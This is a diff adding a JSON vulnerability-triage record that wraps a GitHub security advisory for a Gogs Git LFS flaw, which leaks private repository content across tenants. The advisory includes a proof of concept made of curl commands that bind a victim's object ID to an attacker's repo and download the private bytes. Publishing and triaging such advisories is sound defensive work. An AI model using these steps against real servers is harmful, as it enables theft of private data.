@@ -1,0 +1,57 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/227850795?v=4\", \"events_url\": \"https://api.github.com/users/amwhoi/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/amwhoi/followers\", \"following_url\": \"https://api.github.com/users/amwhoi/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/amwhoi/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/amwhoi\", \"id\": 227850795, \"login\": \"amwhoi\", \"node_id\": \"U_kgDODZS6Kw\", \"organizations_url\": \"https://api.github.com/users/amwhoi/orgs\", \"received_events_url\": \"https://api.github.com/users/amwhoi/received_events\", \"repos_url\": \"https://api.github.com/users/amwhoi/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/amwhoi/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/amwhoi/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/amwhoi\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-52812\", \"cvss\": {\"score\": null, \"vector_string\": null}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 0.0, \"vector_string\": null}, \"cvss_v4\": {\"score\": 7.1, \"vector_string\": \"CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:N/VA:N/SC:L/SI:N/SA:N\"}}, \"cwes\": [{\"cwe_id\": \"CWE-345\", \"name\": \"Insufficient Verification of Data Authenticity\"}, {\"cwe_id\": \"CWE-639\", \"name\": \"Authorization Bypass Through User-Controlled Key\"}, {\"cwe_id\": \"CWE-862\", \"name\": \"Missing Authorization\"}], \"description\": \"Summary\\n\\nGit LFS storage is content-addressed by OID alone (`<LFS-root>/<oid[0]>/<oid[1]>/<oid>`) but per-repo authorization lives in the `lfs_object` table keyed `(repo_id, oid)`. `serveUpload` skips re-uploading when the OID file already exists on disk and inserts a new `(repo_id, oid)` row pointing at it **without verifying the request body hashes to the OID being claimed**. Any user with write access to one repo can bind their repo to an OID owned by a private repo and download the original bytes via their own download endpoint.\\n\\nDetails\\n\\nDedupe shortcut at `internal/lfsx/storage.go:79-82`:\\n\\n```go\\nif fi, err := os.Stat(fpath); err == nil {\\n    _, _ = io.Copy(io.Discard, rc)\\n    return fi.Size(), nil          // ← returns success with no hash check\\n}\\n```\\n\\nHash verification at `internal/lfsx/storage.go:106-108` only runs in the *new-file* branch — the dedupe path returns earlier.\\n\\n`serveUpload` (`internal/route/lfs/basic.go:78-114`) trusts that success and inserts the per-repo binding:\\n\\n```go\\n_, err := h.store.GetLFSObjectByOID(c.Req.Context(), repo.ID, oid)   // per-repo\\nif err == nil { /* already linked, drain & return 200 */ }\\nwritten, err := s.Upload(oid, c.Req.Request.Body)\\nerr = h.store.CreateLFSObject(c.Req.Context(), repo.ID, oid, written, s.Storage())\\n```\\n\\n`CreateLFSObject` is an unconditional `INSERT` on `(repo_id, oid)` with no check that the OID is referenced by the requesting repo's git history.\\n\\n`serveDownload` at `internal/route/lfs/basic.go:42-72` only consults the per-repo row, then streams from the shared content-addressed file.\\n\\nSuggested fix\\n\\n1. In `LocalStorage.Upload`, when `os.Stat(fpath) == nil`, hash the request body via `io.TeeReader` and `ErrOIDMismatch` on disagreement — same code path as the new-file branch already uses. The \\\"client retries after partial failure\\\" use case still works; the retry just has to send the correct content.\\n2. Optional second layer: in `serveUpload`, refuse `CreateLFSObject` unless the OID is referenced by an LFS pointer in the requesting repo's refs.\\n\\nPoC\\n\\nTested against gogs at HEAD `d7571322` (also reproduces on `v0.14.2`, paths are `internal/lfsutil/storage.go` and identical logic).\\n\\n### Reproduction prerequisites\\n- Running gogs ≥ 0.12.0 with `[lfs] ENABLED = true`.\\n- Two accounts: `alice` (private repo `secrets`) and `bob` (any repo `bob/scratch`); bob has no access to `alice/secrets`.\\n- An OID known to be present in `alice/secrets` — leaked LFS pointer file in any public ancestor commit, stale fork, support ticket, or any side channel. Brute force is infeasible (256-bit).\\n\\n### Setup (testbed simulation of the victim's prior state)\\n\\n```sh\\nGOGS=https://gogs.example\\nALICE_AUTH='-u alice:alice_password'\\nBOB_AUTH='-u bob:bob_password'\\n\\nVICTIM_BYTES='victim secret content'\\nOID=$(printf %s \\\"$VICTIM_BYTES\\\" | sha256sum | cut -d' ' -f1)\\nSIZE=$(printf %s \\\"$VICTIM_BYTES\\\" | wc -c)\\n\\n# After this, file lives at <conf.LFS.ObjectsPath>/<OID[0]>/<OID[1]>/<OID>\\n# and (alice/secrets, OID) row exists in lfs_object.\\nprintf %s \\\"$VICTIM_BYTES\\\" | curl -sS $ALICE_AUTH \\\\\\n  -H 'Content-Type: application/octet-stream' \\\\\\n  -X PUT --data-binary @- \\\\\\n  \\\"$GOGS/alice/secrets.git/info/lfs/objects/basic/$OID\\\"\\n```\\n\\n### Attack — bob has only `$OID`, not `$VICTIM_BYTES`\\n\\n```sh\\nunset VICTIM_BYTES   # attacker has no idea what the file contains\\n\\n# 1. Confirm bob has no claim on $OID.\\ncurl -sS $BOB_AUTH \\\\\\n  -H 'Accept: application/vnd.git-lfs+json' \\\\\\n  -H 'Content-Type: application/vnd.git-lfs+json' \\\\\\n  -X POST \\\"$GOGS/bob/scratch.git/info/lfs/objects/batch\\\" \\\\\\n  --data \\\"{\\\\\\\"operation\\\\\\\":\\\\\\\"download\\\\\\\",\\\\\\\"objects\\\\\\\":[{\\\\\\\"oid\\\\\\\":\\\\\\\"$OID\\\\\\\",\\\\\\\"size\\\\\\\":$SIZE}]}\\\"\\n# → \\\"actions\\\":{\\\"error\\\":{\\\"code\\\":404,\\\"message\\\":\\\"Object does not exist\\\"}}\\n\\n# 2. PUT garbage to bob's LFS endpoint. The on-disk OID file already exists\\n#    so LocalStorage.Upload takes the dedupe shortcut: drains the body\\n#    without hashing, returns alice's size; CreateLFSObject inserts (bob, OID).\\ncurl -sS $BOB_AUTH \\\\\\n  -H 'Content-Type: application/octet-stream' \\\\\\n  -X PUT --data-binary 'irrelevant attacker-controlled bytes' \\\\\\n  \\\"$GOGS/bob/scratch.git/info/lfs/objects/basic/$OID\\\"\\n# → HTTP/1.1 200 OK\\n\\n# 3. Download via bob's repo — gogs streams alice's bytes.\\ncurl -sS $BOB_AUTH \\\"$GOGS/bob/scratch.git/info/lfs/objects/basic/$OID\\\" -o /tmp/leaked\\ncat /tmp/leaked\\n# → victim secret content\\nsha256sum /tmp/leaked | cut -d' ' -f1\\n# → matches $OID exactly\\n```\\n\\n### Independent confirmation against the source\\n\\n```sh\\ngit clone https://github.com/gogs/gogs.git && cd gogs\\ngit checkout d7571322\\n\\nsed -n '63,114p' internal/lfsx/storage.go      # dedupe at 79-82, hash check at 106 only in new-file branch\\nsed -n '74,117p' internal/route/lfs/basic.go   # serveUpload calls CreateLFSObject regardless of dedupe path\\ngrep -n 'primaryKey' internal/database/lfs.go  # composite (RepoID, OID) PK — multiple repos can share an OID row\\n```\\n\\nImpact\\n\\n- **Cross-tenant disclosure of any LFS object on the instance.** Attacker needs HTTP write to one repo + knowledge of a target OID; storage path is global, no per-repo isolation.\\n- LFS commonly stores certificates/keys, firmware blobs, ML model weights, datasets containing PII, packaged installers — all extracted byte-for-byte.\\n- Persistent: the `(bob/scratch, OID)` row pins read access until manually deleted; removing bob's repo write access does not revoke prior binds. No artefact on victim's side beyond a 200 in the LFS access log.\", \"epss\": {\"percentage\": 0.00236, \"percentile\": 0.14515}, \"ghsa_id\": \"GHSA-6p9m-q3jp-47h4\", \"github_reviewed_at\": \"2026-06-23T17:10:25Z\", \"html_url\": \"https://github.com/advisories/GHSA-6p9m-q3jp-47h4\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-6p9m-q3jp-47h4\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-52812\"}], \"nvd_published_at\": null, \"published_at\": \"2026-06-23T17:10:25Z\", \"references\": [\"https://github.com/gogs/gogs/security/advisories/GHSA-6p9m-q3jp-47h4\", \"https://github.com/gogs/gogs/pull/8333\", \"https://github.com/gogs/gogs/commit/f35a767af74e05342bafc6fdda02c791816426f8\", \"https://github.com/gogs/gogs/releases/tag/v0.14.3\", \"https://github.com/advisories/GHSA-6p9m-q3jp-47h4\"], \"repository_advisory_url\": \"https://api.github.com/repos/gogs/gogs/security-advisories/GHSA-6p9m-q3jp-47h4\", \"severity\": \"high\", \"source_code_location\": \"https://github.com/gogs/gogs\", \"summary\": \"Gogs: LFS dedupe path leaks private repo content across tenants\", \"type\": \"reviewed\", \"updated_at\": \"2026-06-23T17:10:26Z\", \"url\": \"https://api.github.com/advisories/GHSA-6p9m-q3jp-47h4\", \"vulnerabilities\": [{\"first_patched_version\": \"0.14.3\", \"package\": {\"ecosystem\": \"go\", \"name\": \"gogs.io/gogs\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"< 0.14.3\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-6p9m-q3jp-47h4",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "gogs.io/gogs: < 0.14.3"
+    ],
+    "authentication_required": true,
+    "cves": [
+      "CVE-2026-52812"
+    ],
+    "cvss_score": 7.1,
+    "cvss_vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:N/VA:N/SC:L/SI:N/SA:N",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "gogs.io/gogs"
+    ],
+    "remote": true,
+    "vendor_severity": "high"
+  },
+  "first_seen_at": "2026-07-20T19:51:57.443225Z",
+  "provenance": {
+    "content_sha256": "9085bdf3283ab593b87fdb2754c0bdd7554bdb0dcab6955fcfe84066900453ec",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-06-23T17:10:25Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-6p9m-q3jp-47h4",
+  "status": "active",
+  "title": "Gogs: LFS dedupe path leaks private repo content across tenants",
+  "updated_at": "2026-06-23T17:10:26Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-6p9m-q3jp-47h4"
+}
